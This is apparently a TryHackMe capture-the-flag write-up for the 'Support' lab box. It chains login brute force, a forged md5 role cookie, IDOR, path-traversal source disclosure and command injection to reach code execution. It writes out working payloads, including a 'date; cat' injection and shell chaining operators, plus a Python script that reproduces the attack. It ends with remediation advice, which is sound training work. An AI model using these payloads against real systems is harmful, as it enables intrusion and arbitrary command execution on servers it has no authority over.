# Support (TryHackMe)

- **Path:** Jr Penetration Tester > Web Application Vulnerabilities II (capstone)
- **Completed:** 2026-10-10 - **Target:** <ip> (over VPN)
- **Goal:** pentest the platform and escalate access to achieve R C E on the server.

A single objective (R C E) solved by chaining every technique the module taught: Broken
Authentication, Session/cookie handling, B O L A, File Inclusion, and Command Injection.

## Flags

| Flag | Value | Where |
|---|---|---|
| 1 (admin login) | `THM{…}` | `/var/www/web.txt`, printed on the dashboard when `$_SESSION['admin']===true` |
| 2 (R C E) | `THM{…}` | `/home/ubuntu/user.txt`, read through the command-injection sink (runs as `www-data`) |

## The chain (step by step)

### 1. Broken Authentication (no rate limiting)
Login is `POST /index.php` with `email` and `password`. No lockout, no throttle, so a wordlist
brute force works. Valid helpdesk credential: `help@support.thm : <redacted-pw>`.
A successful login answers `302 -> dashboard.php`; a failure answers `200` with `Invalid
credentials`.

### 2. Session handling: a hash is not a signature
On login the server sets a role cookie:
```
isITUser=<redacted-hash>   # md5("false")
```
The dashboard gates the IT Admin Panel on `($_COOKIE['isITUser'] ?? md5("false")) === md5("true")`.
Forging the cookie to `md5("true")` elevates to IT staff and reveals the internal API link:
```
isITUser=<redacted-hash>   # md5("true")
```

### 3. B O L A / I D O R on the internal API
`api.php?id=<n>` returns a user record (also reachable as the pretty route `/user/<n>`). The data
is a fixed array of three users, keyed by id:
```
id=1 -> specialadmin@support.thm   admin: true
id=2 -> IT@support.thm             admin: false
id=3 -> help@support.thm           admin: false
```
The response strips `password` (`unset($user['password'])`), so the API itself leaks only the
admin email, not the secret. Writes (PUT/PATCH/POST) do nothing: the data is a static array, so
there is no mass-assignment here.

### 4. File Inclusion as source disclosure (the pivot)
`dashboard.php?skin=<value>` renders an inline theme. The sink is a file read, not an include:
```php
$webRoot   = realpath('/var/www/html/skins');
$another   = realpath('/var/www/html');
$requested = realpath($webRoot . '/' . $skin . '.php');
if ($requested !== false && strpos($requested, $another) === 0) {
    readfile($requested);
}
```
Because it is `readfile()` (not `include()`), the raw P H P source is echoed back. The guard only
requires the resolved path to start with `/var/www/html` and the name to end in `.php`. So it
reads the source of any `.php` file under the web root via traversal:
```
?skin=../config            -> config.php  source
?skin=../dashboard         -> dashboard.php source
?skin=../footer            -> footer.php  source (the R C E sink)
?skin=../api               -> api.php     source
?skin=../index             -> index.php   source (login logic)
```
Constraints learned: prefix is fixed `skins/`, suffix is fixed `.php`, and the `realpath`
`strpos` check blocks anything outside the web root (so `/var/www/db.php` and
`/home/ubuntu/user.txt` are NOT readable this way), and P H P stream wrappers
(`php://filter`, `data://`) and null bytes do not help because the base never starts with the
wrapper and modern P H P ignores `%00`.

Key loot from the source:
- `config.php`: `$MASTER_PASSWORD = '<redacted-secret>';` (a hint, not the live secret).
- `index.php`: login compares `$user['email']===$email && $user['password']===$password` against
  `$users` from `/var/www/db.php`, then sets `$_SESSION['admin'] = $user['admin']`.
- `dashboard.php`: if `$_SESSION['admin']===true`, it prints
  `file_get_contents('/var/www/web.txt')` (flag 1).
- `footer.php`: the command-injection sink (see step 6).

### 5. Log in as the admin
The master-password hint `<redacted-secret>` pointed at the real stored secret. The live credential is:
```
specialadmin@support.thm : <redacted-pw>
```
Logging in sets `$_SESSION['admin']=true`, so the dashboard shows:
```
Administrator Access Confirmed
THM{…}
```

### 6. Command Injection -> R C E (flag 2)
`footer.php` (included by `dashboard.php`) exposes an admin-only system widget:
```php
$isAdmin = $_SESSION['admin'];
if ($isAdmin && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys'])) {
    $sys = $_POST['sys'];
    if (strpos($sys, 'date') === 0) {
        $output = shell_exec($sys);          // runs the raw string in a shell
    } else {
        $error = 'Only date command is allowed.';
    }
}
```
The filter only checks that the string STARTS WITH `date`. Chain a second command after it so the
string still begins with `date`:
```
POST /dashboard.php   (as specialadmin)
sys=date; cat /home/ubuntu/user.txt
```
Result (reflected in the page inside a <pre>):
```
Sat Oct 10 11:37:15 UTC 2026
uid=33(www-data) gid=33(www-data) groups=33(www-data)
THM{…}
```
Arbitrary commands run as `www-data`. Shell chaining operators that bypass a "starts-with" filter:
`;`  `&&`  `|`  `` ` ``  `$( )` (all keep `date` at position 0 when placed after it).

## Reproduce (Python requests)
```python
import requests, hashlib, re
B = 'http://<ip>'
s = requests.Session()
# 1-5: become admin
s.post(B+'/index.php', data={'email':'specialadmin@support.thm','password':'<redacted-pw>'})
d = s.get(B+'/dashboard.php').text
print(re.search(r'fs-5">\s*(.*?)\s*</div>', d, re.S).group(1))     # flag 1
# 6: R C E
r = s.post(B+'/dashboard.php', data={'sys':'date; cat /home/ubuntu/user.txt'})
print(re.search(r'<pre class="mb-0">(.*?)</pre>', r.text, re.S).group(1))   # flag 2
```
Source read (steps that revealed the chain), authenticated with a forged IT cookie:
```python
h = {'Cookie': f'PHPSESSID={sess}; isITUser={hashlib.md5(b"true").hexdigest()}'}
requests.get(B+'/dashboard.php', params={'skin':'../footer'}, headers=h).text   # leaks footer.php
```

## Recon notes
- Apache 2.4.58 (Ubuntu), P H P 8.3.6. Directory listing was on (`/skins/`, `/layout/`, `/js/`,
  `/includes/`). `/info.php` was a full `phpinfo()` dump.
- `phpinfo` advertised `session.upload_progress` on and `session.use_strict_mode` off. That looks
  like the classic session-poisoning File Inclusion route, but it is a dead end here: the sink is
  `readfile` (not `include`, so no code execution from an included session file) and the `.php`
  suffix plus the web-root `realpath` guard block including a session file anyway. Do not tunnel on
  the first technique the clues suggest; confirm the sink first.

## Lessons learned
- Treat a theming/skin parameter as a file sink. Test whether it executes (`include`) or discloses
  (`readfile`/`file_get_contents`); source disclosure of application `.php` is often enough to win
  by leaking logic and secrets.
- Secrets left in a readable file (`config.php` master password) seed credential guesses even when
  they are not the exact live value.
- Role decisions driven by a client value (a cookie that is just `md5("true")`) are forgeable.
  Trust must be server-side and signed, not a bare hash.
- A "starts-with" allowlist on a shell command is not sanitisation. Anything that reaches a shell
  (`shell_exec`, `system`, `exec`, `passthru`) must use argument arrays and strict allowlists.

## Remediation
- Theme/skin: map the input to a fixed allowlist of names, never build a path from user input, and
  never echo file contents back.
- Keep credentials out of web-root files and out of source; use hashed passwords in a datastore.
- Sign and server-side-validate session/role state; never trust a client cookie for authorization.
- Replace `shell_exec` with a safe API (argument array, `shell=False` equivalent) and a strict
  input allowlist; run the service with least privilege.
- Remove `info.php`/`phpinfo()` and disable directory listing in production.
